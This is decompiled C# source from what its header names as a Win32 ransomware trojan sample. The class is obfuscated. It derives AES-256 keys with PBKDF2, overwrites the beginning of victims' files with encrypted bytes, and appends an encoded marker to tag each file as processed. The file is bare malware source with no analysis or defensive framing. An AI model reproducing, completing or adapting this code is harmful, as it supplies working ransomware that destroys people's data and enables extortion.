// Decompiled with JetBrains decompiler
// Type: kuMeqwHpurUBOD.luIgktEtlHVR
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace kuMeqwHpurUBOD
{
  public static class luIgktEtlHVR
  {
    public static byte[] ZnyJbIPDofh([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray = (byte[]) null;
      Rfc2898DeriveBytes rfc2898DeriveBytes = luIgktEtlHVR.IzsXTyMzuH(obj1, obj2);
      obj1 = (byte[]) null;
      GC.Collect();
      using (Aes aes = (Aes) new AesManaged())
      {
        aes.KeySize = 256;
        aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
        aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
        aes.Padding = PaddingMode.None;
        aes.Mode = CipherMode.CBC;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(obj0, 0, obj0.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
        rfc2898DeriveBytes.Dispose();
      }
      return numArray;
    }

    public static Rfc2898DeriveBytes IzsXTyMzuH([In] byte[] obj0, [In] byte[] obj1) => new Rfc2898DeriveBytes(obj0, obj1, 52768);

    public static byte[] sjLnWbxhrKF([In] string obj0, [In] int obj1)
    {
      byte[] buffer = new byte[obj1];
      try
      {
        if (BErRpdYOfQAwSr.KGlWteEpKYfz == "YES")
        {
          MemoryMappedFile fromFile = MemoryMappedFile.CreateFromFile(obj0, FileMode.Open);
          MemoryMappedViewStream viewStream = fromFile.CreateViewStream();
          fromFile.Dispose();
          viewStream.Read(buffer, 0, obj1);
          viewStream.Flush();
          viewStream.Close();
          viewStream.Dispose();
          return buffer;
        }
        FileStream fileStream = new FileStream(obj0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        fileStream.Read(buffer, 0, obj1);
        fileStream.Close();
        fileStream.Dispose();
        return buffer;
      }
      catch (Exception ex1)
      {
        if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
        {
          try
          {
            File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + obj0 + " - Error while reading from file: " + ex1.Message + "\r\n");
          }
          catch (Exception ex2)
          {
          }
        }
        FileStream fileStream = new FileStream(obj0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        fileStream.Read(buffer, 0, obj1);
        fileStream.Close();
        fileStream.Dispose();
        return buffer;
      }
    }

    public static void SEcBXBtSwKeqJ(
      string YrxPFTOslcV,
      byte[] DWszvBlRCViF,
      byte[] KIcXskzpJWslXMph = null)
    {
      try
      {
        if (BErRpdYOfQAwSr.KGlWteEpKYfz == "YES")
        {
          byte[] buffer = BErRpdYOfQAwSr.txjxRPsHuzRR ? Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==")) : Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ=="));
          MemoryMappedFile fromFile = MemoryMappedFile.CreateFromFile(YrxPFTOslcV, FileMode.Open);
          MemoryMappedViewStream viewStream = fromFile.CreateViewStream();
          fromFile.Dispose();
          viewStream.Write(DWszvBlRCViF, 0, DWszvBlRCViF.Length);
          viewStream.Flush();
          viewStream.Close();
          viewStream.Dispose();
          using (FileStream fileStream = new FileStream(YrxPFTOslcV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
            {
              fileStream.Write(buffer, 0, buffer.Length);
            }
            else
            {
              fileStream.Write(KIcXskzpJWslXMph, 0, KIcXskzpJWslXMph.Length);
              fileStream.Write(buffer, 0, buffer.Length);
            }
          }
        }
        else
        {
          byte[] buffer = BErRpdYOfQAwSr.txjxRPsHuzRR ? Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==")) : Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ=="));
          FileStream fileStream1 = new FileStream(YrxPFTOslcV, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
          fileStream1.Write(DWszvBlRCViF, 0, DWszvBlRCViF.Length);
          fileStream1.Close();
          fileStream1.Dispose();
          using (FileStream fileStream2 = new FileStream(YrxPFTOslcV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
            {
              fileStream2.Write(buffer, 0, buffer.Length);
            }
            else
            {
              fileStream2.Write(KIcXskzpJWslXMph, 0, KIcXskzpJWslXMph.Length);
              fileStream2.Write(buffer, 0, buffer.Length);
            }
          }
        }
      }
      catch (Exception ex1)
      {
        if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
        {
          try
          {
            File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + YrxPFTOslcV + " - Error while partial writing to file: " + ex1.Message + "\r\n");
          }
          catch (Exception ex2)
          {
          }
        }
        byte[] buffer = BErRpdYOfQAwSr.txjxRPsHuzRR ? Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==")) : Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ=="));
        FileStream fileStream3 = new FileStream(YrxPFTOslcV, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
        fileStream3.Write(DWszvBlRCViF, 0, DWszvBlRCViF.Length);
        fileStream3.Close();
        fileStream3.Dispose();
        using (FileStream fileStream4 = new FileStream(YrxPFTOslcV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
        {
          if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
          {
            fileStream4.Write(buffer, 0, buffer.Length);
          }
          else
          {
            fileStream4.Write(KIcXskzpJWslXMph, 0, KIcXskzpJWslXMph.Length);
            fileStream4.Write(buffer, 0, buffer.Length);
          }
        }
      }
    }
  }
}
